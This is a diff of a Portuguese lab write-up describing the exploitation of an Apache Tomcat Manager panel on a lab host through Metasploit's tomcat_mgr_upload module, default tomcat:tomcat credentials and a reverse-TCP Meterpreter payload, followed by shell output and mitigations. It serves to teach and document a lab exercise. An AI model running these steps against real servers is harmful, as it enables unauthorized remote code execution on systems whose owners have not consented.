@@ -91,15 +91,12 @@ Com o serviço identificado, inicia-se o console do Metasploit Framework em Chuc
 
 ```
 chuck# msfconsole
-msf > search tomcat_mgr
+chuck-msf > search tomcat_mgr
 ```
 
-A pesquisa lista três módulos principais relacionados à administração do Apache Tomcat, destacando-se o módulo de upload autenticado classificado com rank `excellent`:
+A pesquisa lista três módulos principais relacionados à administração do Apache Tomcat, com o módulo de upload sendo classificado com rank `excellent`:
 
 ```
-Matching Modules
-================
-
    #  Name                                         Disclosure Date  Rank       Check  Description
    -  ----                                         ---------------  ----       -----  -----------
    0  exploit/multi/http/tomcat_mgr_deploy         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
@@ -109,23 +106,21 @@ Matching Modules
 
 ## Configuração do Módulo no Metasploit
 
-Em seguida, seleciona-se o módulo `exploit/multi/http/tomcat_mgr_upload` e definem-se os parâmetros obrigatórios: o endereço do alvo (`RHOSTS`), a porta do serviço (`RPORT`), o endereço de escuta do atacante (`LHOST`) e as credenciais padrão do painel administrativo (`tomcat:tomcat`):
+Em seguida, seleciona-se o módulo e definem-se os parâmetros obrigatórios: o endereço do alvo (`RHOSTS`), a porta do serviço (`RPORT`), o endereço de escuta do atacante (`LHOST`) e as credenciais padrão do painel administrativo (`tomcat:tomcat`):
 
 ```
-msf > use exploit/multi/http/tomcat_mgr_upload
-msf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.200.0.1
-msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180
-msf exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.200.0.2
-msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
-msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
-msf exploit(multi/http/tomcat_mgr_upload) > show options
+chuck-msf > use exploit/multi/http/tomcat_mgr_upload
+chuck-msf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.200.0.1
+chuck-msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180
+chuck-msf exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.200.0.2
+chuck-msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
+chuck-msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
+chuck-msf exploit(multi/http/tomcat_mgr_upload) > show options
 ```
 
 A verificação com `show options` confirma que o caminho da aplicação está configurado para `/manager`, o alvo selecionado é `0 (Java Universal)` e o payload padrão `java/meterpreter/reverse_tcp` está pronto para receber a conexão reversa na porta `4444`:
 
 ```
-Module options (exploit/multi/http/tomcat_mgr_upload):
-
    Name          Current Setting  Required  Description
    ----          ---------------  --------  -----------
    HttpPassword  tomcat           no        The password for the specified username
@@ -153,10 +148,10 @@ Exploit target:
 
 ## Exploração e Verificação do Acesso
 
-Com todas as variáveis configuradas, dispara-se o ataque utilizando o comando `exploit`:
+Com todas as variáveis configuradas, o ataque é inicializado utilizando o comando `exploit`:
 
 ```
-msf exploit(multi/http/tomcat_mgr_upload) > exploit
+chuck-msf exploit(multi/http/tomcat_mgr_upload) > exploit
 ```
 
 O Metasploit inicia o manipulador TCP reverso, obtém o token de sessão e CSRF do painel, empacota e envia uma aplicação maliciosa no formato `.war`, executa o payload e remove o arquivo implantado para limpar rastros, abrindo uma sessão **Meterpreter** com sucesso:
@@ -175,27 +170,25 @@ O Metasploit inicia o manipulador TCP reverso, obtém o token de sessão e CSRF 
 Dentro da sessão Meterpreter, verifica-se o usuário ativo no sistema remoto através do comando `getuid` e abre-se um shell interativo no sistema operacional alvo para confirmar a identidade e os privilégios da conta comprometida:
 
 ```
-meterpreter > getuid
+chuck-meterpreter > getuid
 Server username: tomcat55
-meterpreter > shell
+chuck-meterpreter > shell
 Process 1 created.
 Channel 1 created.
-whoami
+chuck# whoami
 tomcat55
-id
+chuck# id
 uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
 ```
 
-Como o serviço do Apache Tomcat estava configurado para rodar sob uma conta de serviço dedicada e não privilegiada, o comprometimento ocorreu sob o usuário `tomcat55` (`uid=110`).
+Como o serviço do Apache Tomcat estava configurado para rodar sob uma conta de serviço dedicada e não privilegiada, o comprometimento ocorreu sob o usuário `tomcat55`.
 
 ## Análise dos Resultados e Conclusão
 
-Os resultados comprovam que o serviço Apache Tomcat em Alice possuía seu painel administrativo (`/manager`) exposto na rede pela porta `8180` e protegido apenas por credenciais padrão (`tomcat:tomcat`). Essa configuração permitiu a exploração referenciada pelo **CVE-2009-3843**, na qual o upload autenticado de um arquivo `.war` resulta em execução remota arbitrária de código no servidor.
-
-**Nota:** Como complemento de investigação durante os testes iniciais, a vulnerabilidade **CVE-2012-2122** no serviço MySQL (porta `3306`) também foi avaliada utilizando Nmap, Metasploit e um script em Python. Os testes confirmaram que a versão do banco de dados instalada em Alice já estava protegida contra essa falha específica, reforçando a importância da validação prática de hipóteses antes da etapa de exploração.
+Os resultados comprovam que o serviço Apache Tomcat em Alice possuía seu painel administrativo exposto na rede pela porta `8180` e protegido apenas por credenciais padrão. Essa configuração permitiu a exploração referenciada pelo **CVE-2009-3843**, na qual o upload autenticado de um arquivo `.war` resulta em execução remota arbitrária de código no servidor.
 
 Para mitigar a vulnerabilidade explorada no Apache Tomcat, recomenda-se:
 
-* Substituir imediatamente as credenciais padrão no arquivo de configuração `tomcat-users.xml` por senhas fortes e exclusivas.
+* Substituir imediatamente as credenciais padrão no arquivo de configuração `tomcat-users.xml` por senhas fortes (21 caracteres como recomendado) e exclusivas.
 * Restringir o acesso à rota `/manager` por meio de filtros de rede ou regras de controle de acesso (`RemoteAddrValve`) apenas para endereços IP administrativos autorizados.
 * Remover ou desabilitar a aplicação `manager` em ambientes de produção quando o gerenciamento remoto via interface web não for estritamente necessário.
